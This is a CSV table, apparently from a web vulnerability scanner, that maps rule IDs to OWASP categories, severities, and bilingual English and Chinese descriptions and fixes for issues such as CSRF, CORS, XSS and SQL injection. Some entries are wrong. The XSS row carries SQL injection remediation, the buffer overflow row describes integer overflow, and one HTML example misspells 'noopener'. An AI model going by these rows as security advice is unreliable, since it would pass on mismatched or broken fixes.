10048,A3,Remote Code Execution - Shell Shock,TRUE,,,,,,,,
10050,Other,Retrieved from Cache,TRUE,,,,,,,,
10051,A3,Relative Path Confusion,TRUE,,,,,,,,
10052,A1,X-ChromeLogger-Data (XCOLD) Header Information Leak,TRUE,,,,,,,,
10054,A1,Cookie without SameSite Attribute,TRUE,Low,Low,Misconfigured Cookie： Missing SameSite Attribute,標頭配置錯誤（缺少SameSite屬性）,"A cookie has been set without the SameSite attribute, which means  that the cookie can be sent as a result of a ‘cross-site’ request. The SameSite attribute is an effective counter measure to cross-site request forgery, cross-site script inclusion, and timing attacks.",檢測到您的網站在標頭中缺少SameSite屬性，該屬性可用來阻止瀏覽器將Cookies 跨網站發送。 主要是用以減少跨網站信息洩漏的風險，並針對跨網站偽造要求的攻擊(cross-site request forgery attacks)作保護。,•Ensure that the SameSite attribute is set to either 'lax' or ideally 'strict' for all cookies.,• SameSite有三個數值 — Strict、Lax和None建議依據網站需求參考Strict＆Lax進行設定Strict Strict的要求最為嚴格，完全禁止第三方Cookies，只有當前網頁的 URL與請求目標一致，才會送出Cookie。 這個規則非常嚴格，適合用於銀行需要交易的網站中，保障客戶資料的安全。Lax Lax的要求則較為寬鬆，大多數情況也是不發送Cookie到第三方 ，但是Get請求除外。 這是一個平衡網路安全和使用者體驗的做法。由於Cookies可以跨網站發送，而風險較高的要求，例如POST，在Lax的設定下將會被禁止，阻止cross-site request forgery attacks 進行。
10055,A5,CSP,TRUE,Low,Low,Misconfigured Headers： CSP,標頭配置錯誤（CSP）,"CSP is an added layer of security that helps to detect and mitigate certain types of attacks, including Cross Site Scripting (XSS) and data injection attacks. Covered types are JavaScript, CSS, HTML frames, fonts, images and embeddable objects such as Java applets, ActiveX, audio and video files.","檢測到您的網站未最佳化CSP安全性設定。
內容安全策略（CSP）是附加性的安全措施，有助於檢測和緩解某些類型的攻擊，包括跨域腳本攻擊（XSS）和數據注入攻擊。 CSP提供了一組標準HTTP標頭，允許網站所有者聲明允許瀏覽器在該頁面上加載的已批准內容來源-涵蓋的類型包括JavaScript，CSS，HTML框架，字體，圖像和可嵌入對象，例如Java applet，ActiveX，音頻和視頻文件。","• To prevent the use of 'unsafe-inline' but still use inline scripts and styles on a page, consider converting them to safe sources via nonces or hashes. 
• For example, using the nonce-source you may specify inline style blocks with： """"Content-Security-Policy： style-src 'nonce-2726c7f26c'"""" and set the same nonce on the style element： '<style nonce=""""2726c7f26c""""> #inline-style { background： red; } </style>' • Hash-source inline styles can be achieved similarly.","• 限制外部連入的檔案和禁用inline語法，這是預設全部阻擋的寫法，也是最嚴格最安全的方案，設定範例如下
content-security-policy: default-src 'none';
• 增加外部連入的白名單，限制外部連入的來源，請避免在來源url中使用「*」，設定範例如下
content-security-policy: default-src 'none'; 
script-src 'self' https://www.google.com;
• 避免在CSP設定中使用「unsafe-inline」"
10056,A1,X-Debug-Token Information Leak,TRUE,,,,,,,,
10057,A1,Username Hash Found,TRUE,,,,,,,,
10058,A5,GET for POST,TRUE,,,,,,,,
10061,A1,X-AspNet-Version Response Header,TRUE,Low,Low,Header Leakage： X-AspNet-Version,標頭資訊洩露（X-AspNet-Version）,"We discovered that your website leaks technology information in the 'Server' header. This vulnerability may disclose the ASP.NET version and type of the backend server, allowing the attacker to fingerprint the site's technologies and pinpoint potential vulnerabilities in outdated software. An attacker may leverage this knowledge to attack your website when a new vulerability is released in the future.",檢測到您的網站在標頭中洩漏X-AspNet-Version信息，該信息可能會洩露後端伺服器資訊以及ASP.NET版本，造成安全風險。攻擊者可比照各種軟韌體版本資訊找出過期或未修補的系統，進而滲透利用。即使當前版本安全，未來若此版本有新漏洞釋出，您的網站可能因洩漏此資訊而在短時間內遭到攻擊。,"Remove the X-AspNet-Version HTTP header. To configure this 
on Apache： Add this line in httpd.conf： Header unset X-AspNet-Version To configure this on nginx： Add this line in the location section in nginx.conf： proxy_hide_header X-AspNet-Version; To configure this on IIS： In the Application_PreSendRequestHeaders() function in Global.asax, add the folowing： response.Headers.remove(""""X-AspNet-Version"""") To configure this in HAProxy： Add the following line to HAProxy's config： http-response del-header X-AspNet-Version","• 移除X-AspNet-Version標頭。 
• 設定Apache 在 httpd.conf中加入一行：Header unset X-AspNet-Version
• 設定nginx在 nginx.conf的location區段中加入一行：proxy_hide_header X-AspNet-Version;
• 設定 IIS在Global.asax的 Application_PreSendRequestHeaders()裡加入一行：response.Headers.remove(""X-AspNet-Version"") 
• 設定HAProxy在HAProxy前端組態設定中加入一行： http-response del-header X-AspNet-Version。"
10062,A1,PII Disclosure,FALSE,,,PII Leakage,,,,,
10095,A4,Backup File Disclosure,TRUE,,,,,,,,
10096,A1,Timestamp Disclosure,FALSE,,,,,,,,
10097,A1,Hash Disclosure,FALSE,,,Hash Disclosure,,,,,
10098,A1,Cross-Domain Misconfiguration,TRUE,Low,Low,Misconfigured Headers： CORS,標頭配置錯誤（CORS）,"We detected that your website has misconfigured CORS headers.
 Due to a misconfigured 'Access-Control-Allow-Origin： *' header on the web server and third party resource loading in the webpage, the victim's browser may load malicious resources and execute harmful scripts. Impact includes credential theft, data leakage, and phishing attempts. Cross-Origin Resource Sharing (CORS) is an HTTP-header based mechanism that allows a server to indicate any other origins (domain, protocol, or port) than its own from which a browser should permit loading of resources. This helps restrict the loaded data to trusted sources and prevent the browser from loading malicious external content. Thus, setting a wildcard directive ('*') nulls the protection from CORS settings.",檢測到您的網站可能有會產生安全疑慮的CORS配置錯誤。常見於設置了「 Access-Control-Allow-Origin: *」，同時網頁引用的第三方網頁中包含XSS或CSRF程式碼，則會導致自身的網頁受到第三方網頁中的惡意程式攻擊。 跨域資源共享（CORS）是一種基於HTTP標頭的機制，它允許伺服器指示瀏覽器應允許加載的資源外的其他任何來源（域，協議或端口），若Web服務器上的“ Access-Control-Allow-Origin”標頭配置錯誤，可能會加載異常或惡意的Web瀏覽器數據。,"• If the application does not require cross-origin requests, check that no policy is set. 
• The 'Access-Control-Allow-Origin' header should never be set to '*' or 'null', unless the whole content of the application is made to be public. Always ensure that it allows the most specific and restrictive set of domains. ","• 如果應用程序不需要跨域請求，請關閉與跨域有關的設定，讓Web瀏覽器以更嚴格的方式實施同源限制。 
• 如需使用跨域請求，需指定來源網域且內容不可以包含「*」與「null」，以常見的網站伺服器Apache為例，請在httpd.conf中新增一行設定「Header set Access-Control-Allow-Origin ""example.com""」，其他網站伺服器請參考供應商的相關設定。"
10104,Other,User Agent Fuzzer,TRUE,,,,,,,,
10105,A7,Weak Authentication Method,TRUE,Medium,High,HTTP Basic/Digest Authentication,HTTP基本身份驗證,"We detected that your website uses HTTP Basic or Digest authentication over an unsecured connection. Consequences include credential theft and user impersonation. HTTP Basic Authentication utilizes simple ID/password pairs with no encryption, which makes it easy for an attacker to intercept login credentials, replay them to other hosts, and trick users into providing the credentials to the wrong location.",檢測到您的網站在不安全的連接上使用HTTP基本身份驗證，這可能會產生安全風險。 使攻擊者可以輕易的攔截登錄憑證，並將其憑證在其他主機重放，誘騙用戶將憑據提供給錯誤的位置。,"• Clearly identifies the host that is requesting authentication credentials 
• Only allows authentication over encrypted secure channel (HTTPS) 
• Does not allow authentication transactions to be replayed or authorization tokens to be reused 
• Does not allow cross-domain authentication requests by default. If cross-domain authentication is desired by a parent site, a white list of domains which are allowed to be authenticated should be defined by CSP or similar site policy. 
• Whitelist or proxy all inlined content in order to block malicious authentication requests 
• Keep the authentication token secure and set a short expiration time","• 清楚的標識正在請求身份驗證憑據的主機。 
• 僅允許通過加密的安全通道（HTTPS）進行身份驗證。 
• 不允許重放身份驗證或重複使用授權token。
• 默認情況下不允許跨域身份驗證請求，如果父站點需要跨域身份驗證，則應通過CSP或類似的站點策略定義允許進行身份驗證的域白名單。 
• 將所有內網內容列入白名單或代理，以阻止惡意身份驗證請求。 
• 確保身份驗證token的安全並設置較短的到期時間。"
10106,A4,HTTP Only Site,TRUE,,,,,,,,
10107,A3,Httpoxy - Proxy Header Misuse,TRUE,,,,,,,,
10108,A4,Reverse Tabnabbing,TRUE,High,Medium,Reverse Tabnabbing,逆向 Tabnabbing,,"檢測到您的網站有受到逆向Tabnabbing攻擊的可能性。​ 
如果用戶對該新頁面進行身份驗證，則其憑證（或其他敏感數據）將被發送到網路釣魚站點，而不是合法站點，使密碼遭竊，例如用釣魚網站替換網頁，但由於用戶最初是位於正確的網頁上，因此他們不太可能注意到最初的正確網頁在導頁後會變更為網路釣魚的站點，特別是該站點看起來與目標站點相同。​","• Add 'rel=""""noopener noreferrer""""' to every 'a'-element that has 'target=""""_blank""""'. 'noopener' ensures that the linked page does not have access to 'window.opener' from the linking page. 'noreferrer' makes sure that the request referrer header is not being sent. This is supported by most recent versions of modern browsers, with Internet Explorer being an exception. • If you are using JavaScript, the following achieves the same： 'var myNewWindow = window.open(url, name, """"noopener,noreferrer"""") myNewWindow.opener = null' 
• If you show user-generated content on your page you must sanitize the input and apply """"noopener noreferrer"""" to every link.","• 將html中所有用到開新視窗的跳轉連結加上noopener與noreferrer設定，以跳轉至google為例
<a href=""https://www.google.com"" target=""_blank"" rel=""noreferrer noopenner"">Google</a>
加上安全性設定後可以確保使用者當前瀏覽的頁面，不會因為開新視窗後被另開的這個網站給影響。
• 將javascript中所有用到開新視窗的跳轉連結加上noopener與noreferrer設定，以跳轉至google為例
window.open('https://www.google.com', '_blank', 'noopener,noreferrer')
加上安全性設定後可以確保使用者當前瀏覽的頁面，不會因為開新視窗後被另開的這個網站給影響。"
10109,Other,Modern Web Application,TRUE,,,,,,,,
10202,A1,Absence of Anti-CSRF Tokens,TRUE,Low,High,Missing Anti-CSRF Ttokens,缺少CSRF Token,"We detected that your website is missing anti-CSRF tokens. A cross-site request forgery(CSRF) is an attack that involves spoofing a victim's authenticated session to perform sensitive actions, such as making a payment or transfer of funds without the victim's knowledge.
 This may result in financial loss, credential theft, and other information disclosure. CSRF attacks are effective in a number of situations including：
• The victim has an active session on the target site. 
• The victim is authenticated via http auth on the target site. 
• The victim is on the same local network as the target site.
 Cross-site request forgery is also known as CSRF, XSRF, one-click attack, session riding, confused deputy, and sea surf.","檢測到您的網站缺少CSRF Tokens，可能會導致跨站點請求偽造攻擊(CSRF)。​ 此攻擊會導致攻擊者以使用者名義發送郵件、消息，盜取帳號，甚至於購買商品，虛擬貨幣轉帳等，使個人隱私洩露以及財產受到損害。 CSRF是一種誘使使用者在他們不知道的情況發送http請求到目標網站，在許多情況下有效，包括：
•受害者在目標站點上進行活動的session。 
•通過目標站點上的http auth對受害者進行身份驗證。 
•受害人與目標站點位於同源網路上。
 CSRF可以在同源策略的範圍內進行，主要用於使用受害人權限對目標站點執行操作。","• Use a vetted library or framework that provides constructs that make this weakness easier to avoid. For example, use anti-CSRF packages such as the OWASP csrfguard. 
• Generate a unique nonce for each form and place the nonce into the form and verify the nonce upon receipt of the form. Be sure that the nonce is not predictable.
• Identify especially dangerous operations, such as financial actions and account changes, and send a separate confirmation request to ensure that the user intended to perform that operation. 
• Use the esapi session management control, which includes a component for CSRF.
• Do not use the get method for any request that triggers a state change.
• Check the http referer header to see if the request originated from an expected page. ","• 為每個表單生成唯一且不可預測的隨機數，將隨機數放入表單，並在收到表單後對隨機數進行驗證。​
• 為了要避免CSRF 攻擊，建議在每階段架構和設計時，使用經過審查的套件或框架。
• 使用Anti-CSRF套件，例如owasp csrfguard。​
• 使用esapi session管理套件管理session， 避免使用任何會觸發狀態更改請求的get method。
• 檢查http引用標頭以查看該請求是否源自預期的頁面。"
20012,A1,Anti-CSRF Tokens Check,TRUE,Medium,High,Missing Anti-CSRF Tokens,缺少CSRF Token,"We detected that your website is missing anti-CSRF tokens. A cross-site request forgery(CSRF) is an attack that involves spoofing a victim's authenticated session to perform sensitive actions, such as making a payment or transfer of funds without the victim's knowledge.
 This may result in financial loss, credential theft, and other information disclosure. CSRF attacks are effective in a number of situations including：
• The victim has an active session on the target site. 
• The victim is authenticated via http auth on the target site. 
• The victim is on the same local network as the target site.
 Cross-site request forgery is also known as CSRF, XSRF, one-click attack, session riding, confused deputy, and sea surf.","檢測到您的網站缺少CSRF Tokens，可能會導致跨站點請求偽造攻擊(CSRF)。​ 此攻擊會導致攻擊者以使用者名義發送郵件、消息，盜取帳號，甚至於購買商品，虛擬貨幣轉帳等，使個人隱私洩露以及財產受到損害。 CSRF是一種誘使使用者在他們不知道的情況發送http請求到目標網站，在許多情況下有效，包括：
•受害者在目標站點上進行活動的session。 
•通過目標站點上的http auth對受害者進行身份驗證。 
•受害人與目標站點位於同源網路上。
 CSRF可以在同源策略的範圍內進行，主要用於使用受害人權限對目標站點執行操作。","• Use a vetted library or framework that provides constructs that make this weakness easier to avoid. For example, use anti-CSRF packages such as the OWASP csrfguard. 
• Generate a unique nonce for each form and place the nonce into the form and verify the nonce upon receipt of the form. Be sure that the nonce is not predictable.
• Identify especially dangerous operations, such as financial actions and account changes, and send a separate confirmation request to ensure that the user intended to perform that operation. 
• Use the esapi session management control, which includes a component for CSRF.
• Do not use the get method for any request that triggers a state change.
• Check the http referer header to see if the request originated from an expected page. ","• 為每個表單生成唯一且不可預測的隨機數，將隨機數放入表單，並在收到表單後對隨機數進行驗證。​
• 為了要避免CSRF 攻擊，建議在每階段架構和設計時，使用經過審查的套件或框架。
• 使用Anti-CSRF套件，例如owasp csrfguard。​
• 使用esapi session管理套件管理session， 避免使用任何會觸發狀態更改請求的get method。
• 檢查http引用標頭以查看該請求是否源自預期的頁面。"
20014,A3,HTTP Parameter Pollution,TRUE,,,,,,,,
20015,A4,Heartbleed OpenSSL Vulnerability,TRUE,,,,,,,,
20016,A1,Cross-Domain Misconfiguration,TRUE,,,,,,,,
20017,A3,Source Code Disclosure - CVE-2012-1823,TRUE,,,,,,,,
20018,A3,Remote Code Execution - CVE-2012-1823,TRUE,,,,,,,,
20019,A1,External Redirect,TRUE,,,,,,,,
30001,Other,Buffer Overflow,TRUE,Medium,Medium,Buffer Overflow,緩衝區溢位,"We have detected that your program returns an error when an 
unusually large value has been submitted, which potentially indicates an integer overflow error. This vulnerability may cause a service to crash, resulting in service interruption, or worse, may allow an attacker to hijack the execution flow of the program and obtain access to the underlying system. Consequently, an attacker may achieve remote code execution and gain high privileged access, taking control over the system. An integer overflow condition exists when an integer, which has not been sufficiently validated from the input stream, is used within a program.",檢測到您的網站當提交異常大的值時，程序將返回錯誤，這可能代表緩衝區溢位的風險。 存在此漏洞是因為程序沒有充分驗證用戶輸入值，例如未設定可輸入字元使攻擊者可以輸入任意長度值，導致系統出錯進而發生服務崩潰、服務中斷，或允許攻擊者劫持程序的執行並獲得對基礎系統的訪問，使攻擊者獲得遠程代碼執行並獲得高特權訪問，從而控制了系統。 當在程序中未使用正確的輸入檢查，便可能導致存在緩衝區溢位。,•Rewrite the background program using proper checking of the size  of user input integers to prevent overflows and divide by 0 errors.,"• 建議在後端程序建立嚴格的輸入檢查來防止緩衝區溢位，常見方法為對欄位最大長度進行限制。
• 後台建立完整的例外處理機制，防止攻擊者利用緩衝區中斷系統服務。"
30002,Other,Format String Error,TRUE,Medium,Low,Format String Error,格式字符串攻擊,"We have detected that your program returns an error when a string  with formatting characters has been submitted, which potentially indicates a format string exploit. This vulnerability may cause a service to crash, resulting in service interruption, or worse, may allow an attacker to hijack the execution flow of the program and obtain access to the underlying system. Consequently, an attacker may achieve remote code execution and gain high privileged access, taking control over the system. The Format String error occurs when the submitted data of an input string has not been sufficiently validate and is thus evaluated as a command by the application.",檢測到您的網站在帶有格式字符的字符串時，程序將導至錯誤頁面，表示格式字符串有被利用的風險進而發生安全風險。​ 這可能導致服務崩潰中斷或是因錯誤頁面中斷登入程序而使攻擊者劫持了登入程序的執行流程，獲得對系統內容的存取，導致攻擊者獲得遠程代碼執行或獲得是高特權權限從而控制系統。 ​ 存在此漏洞是因為程序沒有充分驗證用戶輸入字符串，當應用程序輸入字符串提交作為指令時，就會發生Format String攻擊。,"• Always specify a format string as part of program, not as an input. Most format string vulnerabilities are solved by specifying “%s” as format string and not using the data string as format string. • If possible, make the format string a constant. Extract all the variable parts as other arguments to the call. • Rewrite the background program using proper deletion of bad character strings. This will require a recompile of the background executable.","• 將格式字符串在程序中設定來限制輸入。 例如將“％s”指定為格式字符串。 
• 如果可能，將格式字符串設置為常數，變數以其他參數儲存。 
• 重新編譯後端可執行文件，避免不良的字符串規則。"
30003,Other,Integer Overflow Error,TRUE,Medium,Medium,Buffer Overflow： Integer Overflow,緩衝區溢位（整數溢位）,"We have detected that your program returns an error when an unusually large value has been submitted, which potentially indicates an integer overflow error. This vulnerability may cause a service to crash, resulting in service interruption, or worse, may allow an attacker to hijack the execution flow of the program and obtain access to the underlying system. Consequently, an attacker may achieve remote code execution and gain high privileged access, taking control over the system. An integer overflow condition exists when an integer, which has not been sufficiently validated from the input stream, is used within a program.",檢測到您的網站當提交異常大的值時，程序將返回錯誤，這可能代表緩衝區溢位的風險。 存在此漏洞是因為程序沒有充分驗證用戶輸入值，例如未設定可輸入字元使攻擊者可以輸入任意長度值，導致系統出錯進而發生服務崩潰、服務中斷，或允許攻擊者劫持程序的執行並獲得對基礎系統的訪問，使攻擊者獲得遠程代碼執行並獲得高特權訪問，從而控制了系統。 當在程序中未使用正確的輸入檢查，便可能導致存在緩衝區溢位。,•Rewrite the background program using proper checking of the size of user input integers to prevent overflows and divide by 0 errors.,"• 建議在後端程序建立嚴格的輸入檢查來防止緩衝區溢
位，一般狀況下建議將欄位長度限制到僅能輸入20個以下的字元。"
40003,A3,CRLF Injection,TRUE,,,,,,,,
40008,A4,Parameter Tampering,TRUE,,,,,,,,
40009,A3,Server Side Include,TRUE,,,,,,,,
40012,A3,Cross Site Scripting (Reflected),TRUE,High,Medium,Cross Site Scripting (XSS),跨域腳本攻擊,"We detected that your website has cross site scripting (XSS) vulnerabilities. XSS works by manipulating a vulnerable web site so that it returns malicious JavaScript to users. When the malicious code executes inside a victim's browser, the attacker can fully compromise their interaction with the application. For example, if a website includes user input in its source code, but does not perform any input validation, then an attacker may use a phishing attempt to lure a victim to click on a link that includes malicious parameters in order to execute malicious code in the victim's browser. As a result, the attacker may compromise the victim's account by stealing the cookies and other personal information. This attack is also known as Reflected XSS.","檢測到您的網站可能有跨域腳本攻擊的安全風險。
該問題常見於沒有限制數字、符號、特殊字元等不合理輸入的網頁，導致輸入程式碼時被瀏覽器解析並執行，此時駭客可以構造帶有竊取用戶帳密程式碼的惡意連結，透過釣魚攻擊傳送給用戶，若用戶點擊此連結，便會載入此頁面，觸發惡意程式將自己的資訊傳送給駭客。如果駭客透過誘使用戶載入惡意程式來觸發跨域腳本攻擊，稱之為反射型的跨域腳本攻擊。","• Perform input validation on all data using, for example, regular expressions perform other checks.
• Use prepared statements with variable binding (aka parameterized queries) to write database queries. This forces the developer to first define all the SQL code, and then pass in each parameter to the query later, regardless of what user input is supplied.
• Encode user input to prevent speical characters from being evaluated as commands. 
• When a SQL query error has occured, avoid showing the error messages on the website. This allows an attacker to fingerprint your database using such information leakage. 
• Minimize the privileges assigned to every database account in your environment to minimize the damage of a successful SQL injection attack.","• 做好輸入驗證與檢查，不論是前後端都應假設輸入都是惡意且不可信任的 。
• 應確認每個輸入欄位是否為合理的資料類型與內容，例如年齡的欄位在文法上應只接受0-9的數字，而語意上應確認此數字介於 0-120。 
• 任何輸入，尤其是難以定義文法的自由格式，都應經由編碼轉義為純字符串來處理，防止此內容被視為程式碼執行。許多程式框架都有提供內建編碼函式庫，可多加利用。 
• 絕對不要將使用者輸入放入 <script>、註解、屬性名稱、標籤名稱、內聯事件監聽器等，因為這些位置都能將字符串作為程式碼運行 。
• 對cookie設定HttpOnly的屬性，確保程式碼沒有存取權 
• 設定X-XSS-Protection：0的標頭 
• 設定內容安全策略（CSP）的標頭，可明確定義允許瀏覽器在該頁面上加載的內容來源，涵蓋的類型包括JavaScript，CSS，HTML框架，字體，圖像和可嵌入對象，例如Java applet，ActiveX，影音文件"""
40013,A7,Session Fixation,TRUE,,,,,,,,
40014,A3,Cross Site Scripting (Persistent),TRUE,,,,,,,,
40016,A3,Cross Site Scripting (Persistent) - Prime,TRUE,,,,,,,,
40017,A3,Cross Site Scripting (Persistent) - Spider,TRUE,,,,,,,,
40018,A3,SQL Injection,TRUE,High,Medium,SQL Injection,資料庫注入攻擊,"We detected that your website has SQL Injection vulnerabilities. This allow attackers to spoof identity, tamper with existing data, cause repudiation issues such as voiding transactions or changing balances, allow the complete disclosure of all data on the system, destroy the data or make it otherwise unavailable, and become administrators of the database server. SQL injection happens when a website includes input data in a SQL query without sufficiently validating it. As a result, an attacker may submits a SQL query via the input data to alter the execution of predefined SQL commands.","檢測到您的網站可能有資料庫注入攻擊的安全風險。
常見於駭客輸入預期之外但符合SQL語法的命令來竄改 SQL 查詢的指令，從而繞過訪問限制直接操作資料庫，可能造成資料外洩、帳密失竊。 當一個網頁將使用者任意輸入的資訊未經處理或是過濾便嵌入其SQL 查詢的程式碼中，將導致駭客可以利用此漏洞注入惡意 SQL 查詢程式碼，進而獲得資料庫任意讀取或寫入權限，都可稱之為 SQL 注入攻擊。","• Perform input validation on all data using, for example, regular expressions perform other checks.
• Use prepared statements with variable binding (aka parameterized queries) to write database queries. This forces the developer to first define all the SQL code, and then pass in each parameter to the query later, regardless of what user input is supplied.
• Encode user input to prevent speical characters from being evaluated as commands. 
• When a SQL query error has occured, avoid showing the error messages on the website. This allows an attacker to fingerprint your database using such information leakage. 
• Minimize the privileges assigned to every database account in your environment to minimize the damage of a successful SQL injection attack.","•檢查輸入的資料是否為期望的資料格式，可使用正規表達式或其他方法進行過濾，防止預期外的輸入。 
•不要直接拼接 SQL 查詢語法，而是使用資料庫或第三方套件提供的參數化查詢接口。
•對使用者的輸入進行轉義或是編碼處理，避免含有特殊字符的字串被當作指令解析。
•發生 SQL 查詢語法錯誤時，避免直接將錯誤訊息或是 SQL 查詢結果顯示於頁面上，防止駭客透過此洩露資訊進行攻擊。 
•限制用戶對資料庫的存取權限，僅給予最低能滿足需求的權限，進而減少此攻擊對資料庫的危害。"
40019,A3,SQL Injection - MySQL,TRUE,High,Medium,SQL Injection,資料庫注入攻擊,"We detected that your website has SQL Injection vulnerabilities. This allow attackers to spoof identity, tamper with existing data, cause repudiation issues such as voiding transactions or changing balances, allow the complete disclosure of all data on the system, destroy the data or make it otherwise unavailable, and become administrators of the database server. SQL injection happens when a website includes input data in a SQL query without sufficiently validating it. As a result, an attacker may submits a SQL query via the input data to alter the execution of predefined SQL commands.","檢測到您的網站可能有資料庫注入攻擊的安全風險。
常見於駭客輸入預期之外但符合SQL語法的命令來竄改 SQL 查詢的指令，從而繞過訪問限制直接操作資料庫，可能造成資料外洩、帳密失竊。 當一個網頁將使用者任意輸入的資訊未經處理或是過濾便嵌入其SQL 查詢的程式碼中，將導致駭客可以利用此漏洞注入惡意 SQL 查詢程式碼，進而獲得資料庫任意讀取或寫入權限，都可稱之為 SQL 注入攻擊。","• Perform input validation on all data using, for example, regular expressions or strconv() to transform the data and perform other checks 
• Use prepared statements with variable binding (aka parameterized queries) to write database queries. This forces the developer to first define all the SQL code, and then pass in each parameter to the query later, regardless of what user input is supplied. For example, use PreparedStatement() in Java, SqlCommand() or OleCommand() in .NET, and sqlite3_prepare() in SQLite. 
• Encode user input to prevent speical characters from being evaluated as commands. 
• When a SQL query error has occured, avoid showing the error messages on the website. This allows an attacker to fingerprint your database using such information leakage. 
• Minimize the privileges assigned to every database account in your environment to minimize the damage of a successful SQL injection attack.","•檢查輸入的資料是否為期望的資料格式，可使用正規表達式或其他方法進行過濾，防止預期外的輸入。 
•不要直接拼接 SQL 查詢語法，而是使用資料庫或第三方套件提供的參數化查詢接口。
•對使用者的輸入進行轉義或是編碼處理，避免含有特殊字符的字串被當作指令解析。
•發生 SQL 查詢語法錯誤時，避免直接將錯誤訊息或是 SQL 查詢結果顯示於頁面上，防止駭客透過此洩露資訊進行攻擊。 
•限制用戶對資料庫的存取權限，僅給予最低能滿足需求的權限，進而減少此攻擊對資料庫的危害。"
40020,A3,SQL Injection - Hypersonic SQL,TRUE,,Medium,SQL Injection,資料庫注入攻擊,"We detected that your website has SQL Injection vulnerabilities. This allow attackers to spoof identity, tamper with existing data, cause repudiation issues such as voiding transactions or changing balances, allow the complete disclosure of all data on the system, destroy the data or make it otherwise unavailable, and become administrators of the database server. SQL injection happens when a website includes input data in a SQL query without sufficiently validating it. As a result, an attacker may submits a SQL query via the input data to alter the execution of predefined SQL commands.","檢測到您的網站可能有資料庫注入攻擊的安全風險。
常見於駭客輸入預期之外但符合SQL語法的命令來竄改 SQL 查詢的指令，從而繞過訪問限制直接操作資料庫，可能造成資料外洩、帳密失竊。 當一個網頁將使用者任意輸入的資訊未經處理或是過濾便嵌入其SQL 查詢的程式碼中，將導致駭客可以利用此漏洞注入惡意 SQL 查詢程式碼，進而獲得資料庫任意讀取或寫入權限，都可稱之為 SQL 注入攻擊。","• Perform input validation on all data using, for example, regular expressions perform other checks.
• Use prepared statements with variable binding (aka parameterized queries) to write database queries. This forces the developer to first define all the SQL code, and then pass in each parameter to the query later, regardless of what user input is supplied.
• Encode user input to prevent speical characters from being evaluated as commands. 
• When a SQL query error has occured, avoid showing the error messages on the website. This allows an attacker to fingerprint your database using such information leakage. 
• Minimize the privileges assigned to every database account in your environment to minimize the damage of a successful SQL injection attack.","•檢查輸入的資料是否為期望的資料格式，可使用正規表達式或其他方法進行過濾，防止預期外的輸入。 
•不要直接拼接 SQL 查詢語法，而是使用資料庫或第三方套件提供的參數化查詢接口。
•對使用者的輸入進行轉義或是編碼處理，避免含有特殊字符的字串被當作指令解析。
•發生 SQL 查詢語法錯誤時，避免直接將錯誤訊息或是 SQL 查詢結果顯示於頁面上，防止駭客透過此洩露資訊進行攻擊。 
•限制用戶對資料庫的存取權限，僅給予最低能滿足需求的權限，進而減少此攻擊對資料庫的危害。"
40021,A3,SQL Injection - Oracle,TRUE,High,Medium,SQL Injection,資料庫注入攻擊,"We detected that your website has SQL Injection vulnerabilities. This allow attackers to spoof identity, tamper with existing data, cause repudiation issues such as voiding transactions or changing balances, allow the complete disclosure of all data on the system, destroy the data or make it otherwise unavailable, and become administrators of the database server. SQL injection happens when a website includes input data in a SQL query without sufficiently validating it. As a result, an attacker may submits a SQL query via the input data to alter the execution of predefined SQL commands.","檢測到您的網站可能有資料庫注入攻擊的安全風險。
常見於駭客輸入預期之外但符合SQL語法的命令來竄改 SQL 查詢的指令，從而繞過訪問限制直接操作資料庫，可能造成資料外洩、帳密失竊。 當一個網頁將使用者任意輸入的資訊未經處理或是過濾便嵌入其SQL 查詢的程式碼中，將導致駭客可以利用此漏洞注入惡意 SQL 查詢程式碼，進而獲得資料庫任意讀取或寫入權限，都可稱之為 SQL 注入攻擊。","• Perform input validation on all data using, for example, regular expressions or strconv() to transform the data and perform other checks 
• Use prepared statements with variable binding (aka parameterized queries) to write database queries. This forces the developer to first define all the SQL code, and then pass in each parameter to the query later, regardless of what user input is supplied. For example, use PreparedStatement() in Java, SqlCommand() or OleCommand() in .NET, and sqlite3_prepare() in SQLite. 
• Encode user input to prevent speical characters from being evaluated as commands. 
• When a SQL query error has occured, avoid showing the error messages on the website. This allows an attacker to fingerprint your database using such information leakage. 
• Minimize the privileges assigned to every database account in your environment to minimize the damage of a successful SQL injection attack.","•檢查輸入的資料是否為期望的資料格式，可使用正規表達式或其他方法進行過濾，防止預期外的輸入。 
•不要直接拼接 SQL 查詢語法，而是使用資料庫或第三方套件提供的參數化查詢接口。
•對使用者的輸入進行轉義或是編碼處理，避免含有特殊字符的字串被當作指令解析。
•發生 SQL 查詢語法錯誤時，避免直接將錯誤訊息或是 SQL 查詢結果顯示於頁面上，防止駭客透過此洩露資訊進行攻擊。 
•限制用戶對資料庫的存取權限，僅給予最低能滿足需求的權限，進而減少此攻擊對資料庫的危害。"
40022,A3,SQL Injection - PostgreSQL,TRUE,High,Medium,SQL Injection,資料庫注入攻擊,"We detected that your website has SQL Injection vulnerabilities. This allow attackers to spoof identity, tamper with existing data, cause repudiation issues such as voiding transactions or changing balances, allow the complete disclosure of all data on the system, destroy the data or make it otherwise unavailable, and become administrators of the database server. SQL injection happens when a website includes input data in a SQL query without sufficiently validating it. As a result, an attacker may submits a SQL query via the input data to alter the execution of predefined SQL commands.","檢測到您的網站可能有資料庫注入攻擊的安全風險。
常見於駭客輸入預期之外但符合SQL語法的命令來竄改 SQL 查詢的指令，從而繞過訪問限制直接操作資料庫，可能造成資料外洩、帳密失竊。 當一個網頁將使用者任意輸入的資訊未經處理或是過濾便嵌入其SQL 查詢的程式碼中，將導致駭客可以利用此漏洞注入惡意 SQL 查詢程式碼，進而獲得資料庫任意讀取或寫入權限，都可稱之為 SQL 注入攻擊。","• Perform input validation on all data using, for example, regular expressions or strconv() to transform the data and perform other checks 
• Use prepared statements with variable binding (aka parameterized queries) to write database queries. This forces the developer to first define all the SQL code, and then pass in each parameter to the query later, regardless of what user input is supplied. For example, use PreparedStatement() in Java, SqlCommand() or OleCommand() in .NET, and sqlite3_prepare() in SQLite. 
• Encode user input to prevent speical characters from being evaluated as commands. 
• When a SQL query error has occured, avoid showing the error messages on the website. This allows an attacker to fingerprint your database using such information leakage. 
• Minimize the privileges assigned to every database account in your environment to minimize the damage of a successful SQL injection attack.","•檢查輸入的資料是否為期望的資料格式，可使用正規表達式或其他方法進行過濾，防止預期外的輸入。 
•不要直接拼接 SQL 查詢語法，而是使用資料庫或第三方套件提供的參數化查詢接口。
•對使用者的輸入進行轉義或是編碼處理，避免含有特殊字符的字串被當作指令解析。
•發生 SQL 查詢語法錯誤時，避免直接將錯誤訊息或是 SQL 查詢結果顯示於頁面上，防止駭客透過此洩露資訊進行攻擊。 
